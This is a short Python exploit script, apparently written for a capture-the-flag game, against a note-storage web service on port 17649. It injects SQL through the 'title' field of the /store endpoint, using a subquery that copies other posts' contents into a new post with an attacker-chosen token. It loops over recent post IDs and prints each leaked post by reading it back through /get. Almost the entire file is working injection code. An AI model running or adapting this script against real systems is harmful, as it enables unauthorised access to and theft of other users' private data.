#!/usr/bin/env python3

import requests
import json
import sys



ip = sys.argv[1]


data = {
    'title': 'lol',
    'content': "lol",
    'public': False,
    'token': ''
}


r = requests.post(f"http://{ip}:17649/store", json=data)

answer = json.loads(r.text)

total = int(answer['data']['post_id'])

for i in range(total + 100, total, -1):
    i_s = str(i)
    data = {
        'title': f'", (select content from posts where post_id={i_s} limit 0,1), "my_token");--',
        'content': "",
        'public': True,
        'token': ''
    }


    r = requests.post(f"http://{ip}:17649/store", json=data)

    answer = json.loads(r.text)


    data = {
        'post_id': answer['data']['post_id'],
        'token': "my_token",
    }

    r = requests.get(f"http://{ip}:17649/get", json=data)

    print(r.text, flush=True)

